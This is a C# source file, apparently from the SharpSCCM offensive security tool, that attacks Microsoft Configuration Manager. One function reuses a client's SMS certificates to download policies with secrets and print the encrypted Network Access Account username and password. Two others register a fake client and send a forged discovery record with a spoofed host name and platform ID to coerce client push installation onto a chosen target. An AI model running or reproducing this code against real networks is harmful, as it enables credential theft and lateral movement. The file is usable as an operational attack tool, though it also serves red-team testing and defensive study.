using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Xml;

// Configuration Manager SDK
using Microsoft.ConfigurationManagement.Messaging.Framework;
using Microsoft.ConfigurationManagement.Messaging.Messages;
using Microsoft.ConfigurationManagement.Messaging.Sender.Http;

namespace SharpSCCM
{
    static class MgmtPointMessaging
    {
        public static MessageCertificateX509Volatile CreateUserCertificate()
        {
            // Generate certificate for signing and encrypting messages
            RSA rsaKey = RSA.Create(2048);
            CertificateRequest certRequest = new CertificateRequest("CN=ConfigMgr Client", rsaKey, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            certRequest.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.DataEncipherment, false));
            // Any extended key usage
            certRequest.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(new OidCollection { new Oid("1.3.6.1.4.1.311.101.2"), new Oid("1.3.6.1.4.1.311.101") }, true));
            X509Certificate2 certificate2 = certRequest.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
            certificate2.FriendlyName = "ConfigMgr Client Certificate";
            X509Certificate2 exportedCert = new X509Certificate2(certificate2.Export(X509ContentType.Pfx, string.Empty));
            MessageCertificateX509Volatile certificate = new MessageCertificateX509Volatile(exportedCert);
            return certificate;
        }

        public static MessageCertificateX509 GetEncryptionCertificate()
        {
            // Get encryption certificate used by the legitimate client
            MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101.2", false);
            return certificate;
        }

        public static void GetNetworkAccessAccounts(string server, string sitecode)
        {
            // HTTP sender is used for sending messages to the MP
            HttpSender sender = new HttpSender();

            // Get certificates from local machine
            MessageCertificateX509 signingCertificate = GetSigningCertificate();
            MessageCertificateX509 encryptionCertificate = GetEncryptionCertificate();
            //MessageCertificateX509 certificate = CreateUserCertificate();

            // Register a new client. Using existing client does not work, likely because the certificate does not match what the server expects
            //SmsClientId clientId = RegisterClient(certificate, null, server, sitecode);
            //SendDDR(certificate, null, server, sitecode, clientId);

            // Send request for policy assignments to obtain policy locations
            ConfigMgrPolicyAssignmentRequest assignmentRequest = new ConfigMgrPolicyAssignmentRequest();

            // Add our certificate for message signing and encryption
            assignmentRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
            assignmentRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
            //assignmentRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);

            SmsClientId clientId = ClientWmi.GetSmsId();
            assignmentRequest.SmsId = clientId;
            assignmentRequest.Settings.HostName = server;
            assignmentRequest.Settings.Compression = MessageCompression.Zlib;
            assignmentRequest.Settings.ReplyCompression = MessageCompression.Zlib;
            assignmentRequest.SiteCode = sitecode;
            assignmentRequest.SerializeMessageBody();
            Console.WriteLine($"[+] Obtaining {assignmentRequest.RequestType} {assignmentRequest.ResourceType} policy assignment from {assignmentRequest.Settings.HostName} {assignmentRequest.SiteCode}");
            Console.WriteLine($"\n[+] Policy assignment request body:\n{System.Xml.Linq.XElement.Parse("<root>" + assignmentRequest.Body + "</root>")}");
            ConfigMgrPolicyAssignmentReply assignmentReply = assignmentRequest.SendMessage(sender);
            Console.WriteLine($"\n[+] Policy assignment reply body:\n {assignmentReply.Body}");

            // Send request to download the body of the assigned policies
            ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply);

            // Add our certificate for message signing and encryption
            policyDownloadRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
            policyDownloadRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
            //policyDownloadRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);

            // Discover local properties
            policyDownloadRequest.Discover();
            policyDownloadRequest.SmsId = clientId;
            policyDownloadRequest.DownloadSecrets = true;
            policyDownloadRequest.Settings.HostName = server;
            policyDownloadRequest.Settings.Compression = MessageCompression.Zlib;
            policyDownloadRequest.Settings.ReplyCompression = MessageCompression.Zlib;
            policyDownloadRequest.SiteCode = sitecode;
            policyDownloadRequest.SerializeMessageBody();
            Console.WriteLine($"[+] Sending policy download request to {policyDownloadRequest.Settings.HostName}:{policyDownloadRequest.SiteCode}");
            //Console.WriteLine($"[+] Policy request body:\n{System.Xml.Linq.XElement.Parse("<root>" + policyDownloadRequest.Body + "</root>")}");
            //foreach (var attachment in policyDownloadRequest.Attachments)
            //{
            //    Console.WriteLine(attachment.Body);
            //}
            ConfigMgrPolicyBodyDownloadReply policyDownloadReply = policyDownloadRequest.SendMessage(sender);
            Console.WriteLine("\n[+] Policy download reply body:\n");
            foreach (PolicyBody policyBody in policyDownloadReply.ReplyPolicyBodies)
            {
                //Console.WriteLine(policyBody.RawPolicyText);
                if (policyBody.RawPolicyText.Contains("NetworkAccess"))
                {
                    XmlDocument policyXmlDoc = new XmlDocument();
                    policyXmlDoc.LoadXml(policyBody.RawPolicyText.Trim().Remove(0, 1));
                    string encryptedUsername = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.InnerText;
                    string encryptedPassword = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.NextSibling.InnerText;
                    Console.WriteLine($"\n[+] Encrypted NetworkAccessUsername: {encryptedUsername}");
                    Console.WriteLine($"\n[+] Encrypted NetworkAccessPassword: {encryptedPassword}");
                    /*
                    // Request MP certificates
                    ConfigMgrMPCertRequest certRequest = new ConfigMgrMPCertRequest();
                    certRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
                    certRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
                    certRequest.SmsId = clientId;
                    certRequest.Settings.HostName = server;
                    certRequest.Settings.Compression = MessageCompression.Zlib;
                    certRequest.Settings.ReplyCompression = MessageCompression.Zlib;
                    certRequest.SiteCode = sitecode;
                    certRequest.SerializeMessageBody();
                    Console.WriteLine($"\n[+] Requesting management point certificate for data decryption");
                    ConfigMgrMPCertReply certReply = certRequest.SendMessage(sender);
                    Console.WriteLine(certReply.MPCertificate.Certificate.PublicKey);
                    MessageCertificateX509Volatile certReplyCert = new MessageCertificateX509Volatile(certReply.MPCertificate.Certificate);
                    */
                    //Console.WriteLine($"\n[+] Decrypted NetworkAccessUsername: {ByteArrayToString(encryptionCertificate.Decrypt(StringToByteArray(encryptedUsername)))}");
                    //Console.WriteLine($"\n[+] Decrypted NetworkAccessPassword: {ByteArrayToString(encryptionCertificate.Decrypt(StringToByteArray(encryptedPassword)))}");
                    //Console.WriteLine($"\n[+] Decrypted NetworkAccessUsername: {ByteArrayToString(certificate.Decrypt(StringToByteArray(encryptedUsername)))}");
                }
            }
        }

        public static MessageCertificateX509 GetSigningCertificate()
        {
            // Get signing certificate used by the legitimate client
            MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101", false);
            return certificate;
        }

        public static SmsClientId RegisterClient(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode)
        {
            // HTTP sender is used for sending messages to the MP
            HttpSender sender = new HttpSender();

            // Create a registration request
            ConfigMgrRegistrationRequest registrationRequest = new ConfigMgrRegistrationRequest();

            // Add our certificate for message signing
            registrationRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing);

            // Discover local properties for client registration request
            Console.WriteLine("[+] Discovering local properties for client registration request");
            registrationRequest.Discover();

            // Modify properties
            Console.WriteLine("[+] Modifying client registration request properties");
            registrationRequest.AgentIdentity = "CCMSetup.exe";
            if (!string.IsNullOrEmpty(target))
            {
                registrationRequest.ClientFqdn = target;
                registrationRequest.NetBiosName = target;
            }
            Console.WriteLine($"  ClientFqdn: {registrationRequest.ClientFqdn}"); // Original ClientFqdn derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName + <domain name>
            Console.WriteLine($"  NetBiosName: {registrationRequest.NetBiosName}"); // Original NetBiosName derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName
            registrationRequest.Settings.HostName = managementPoint;
            registrationRequest.Settings.Compression = MessageCompression.Zlib;
            registrationRequest.Settings.ReplyCompression = MessageCompression.Zlib;
            registrationRequest.SiteCode = siteCode;
            Console.WriteLine($"  SiteCode: {registrationRequest.SiteCode}");

            // Serialize message XML and display to user
            registrationRequest.SerializeMessageBody();
            //Console.WriteLine($"\n[+] Registration Request Body:\n{System.Xml.Linq.XElement.Parse(registrationRequest.Body.ToString())}");

            // Register client and wait for a confirmation with the SMSID
            Console.WriteLine($"[+] Sending HTTP registration request to {registrationRequest.Settings.HostName}:{registrationRequest.Settings.HttpPort}");
            SmsClientId clientId = registrationRequest.RegisterClient(sender, TimeSpan.FromMinutes(5));
            Console.WriteLine($"[+] Received unique GUID for new device: {clientId.ToString()}");
            return clientId;
        }

        public static void SendDDR(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, SmsClientId clientId)
        {
            // HTTP sender is used for sending messages to the MP
            HttpSender sender = new HttpSender();

            // Build a gratuitous heartbeat DDR to send inventory information for the newly created system to SCCM
            ConfigMgrDataDiscoveryRecordMessage ddrMessage = new ConfigMgrDataDiscoveryRecordMessage();

            // Add our certificate for message signing and encryption
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Encryption);

            // Discover local properties for DDR inventory report
            Console.WriteLine("[+] Discovering local properties for DDR inventory report");
            ddrMessage.Discover(); // This is required to generate the inventory report XML

            // Modify properties
            Console.WriteLine("[+] Modifying DDR and inventory report properties");
            // Set the client GUID to the one registered for the new fake client
            ddrMessage.SmsId = new SmsClientId(clientId.ToString());
            string originalSourceHost = ddrMessage.Settings.SourceHost.ToString();
            // Set target to local machine if not provided in command line option
            if (string.IsNullOrEmpty(target))
            {
                target = originalSourceHost;
            }
            ddrMessage.Settings.SourceHost = target;
            ddrMessage.NetBiosName = target;
            ddrMessage.SiteCode = siteCode;
            ddrMessage.SerializeMessageBody(); // This is required to build the DDR XML and inventory report XML but must take place after all modifications to the DDR message body

            // Update inventory report header with new device information
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientId = new InventoryClientIdBase(clientId);
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientInstalled = false;
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.NetBiosName = target;

            // Modify DDR XML
            string ddrBodyXml = ddrMessage.Body.ToString();
            XmlDocument ddrXmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            ddrXmlDoc.LoadXml("<root>" + ddrBodyXml + "</root>");
            XmlNode clientInstalled = ddrXmlDoc.SelectSingleNode("//ClientInstalled");
            clientInstalled.InnerText = "0";
            XmlNode modifiedDdrXml = ddrXmlDoc.SelectSingleNode("//root");
            ddrBodyXml = modifiedDdrXml.InnerXml;
            // Use reflection to modify read-only Body property
            typeof(MessageBody).GetProperty("Payload").SetValue(ddrMessage.Body, ddrBodyXml);

            // Modify inventory report XML
            string inventoryReportXml = ddrMessage.InventoryReport.ReportBody.RawXml;
            XmlDocument inventoryXmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            inventoryXmlDoc.LoadXml("<root>" + inventoryReportXml + "</root>");
            // Replace OperatingSystemVersion special attribute (a.k.a. PlatformID) with Windows Workstation to coerce client push installation
            XmlNode platformIdNode = inventoryXmlDoc.SelectSingleNode("//PlatformID");
            Console.WriteLine($"[+] Discovered PlatformID: {platformIdNode.InnerXml}");
            platformIdNode.InnerText = "Microsoft Windows NT Workstation 2010.0";
            Console.WriteLine($"[+] Modified PlatformID: {platformIdNode.InnerXml}");
            // Replace original FQDN with supplied one
            XmlNode fqdnNode = inventoryXmlDoc.SelectSingleNode("//FQDN");
            fqdnNode.InnerText = target;
            XmlNode modifiedXml = inventoryXmlDoc.SelectSingleNode("//root");
            inventoryReportXml = modifiedXml.InnerXml;
            // Replace original NetBIOS name with supplied name
            inventoryReportXml = inventoryReportXml.Replace(originalSourceHost, target);
            // Use reflection to modify read-only RawXml property
            typeof(InventoryReportBody).GetProperty("RawXml").SetValue(ddrMessage.InventoryReport.ReportBody, inventoryReportXml);

            // Display XML to user
            //Console.WriteLine($"\n[+] DDR Body:\n{System.Xml.Linq.XElement.Parse(ddrBodyXml)}");
            //Console.WriteLine($"\n[+] Inventory Report Body:\n{System.Xml.Linq.XElement.Parse("<root>" + ddrMessage.InventoryReport.ReportBody.RawXml + "</root>")}\n");

            // Assemble message and send
            ddrMessage.Settings.Compression = MessageCompression.Zlib;
            ddrMessage.Settings.ReplyCompression = MessageCompression.Zlib;
            ddrMessage.Settings.HostName = managementPoint;
            Console.WriteLine($"[+] Sending DDR from {ddrMessage.SmsId} to {ddrMessage.Settings.Endpoint} endpoint on {ddrMessage.Settings.HostName}:{ddrMessage.SiteCode} and requesting client installation on {target}");
            ddrMessage.SendMessage(sender);
            Console.WriteLine("[+] Done!");
        }
    }
}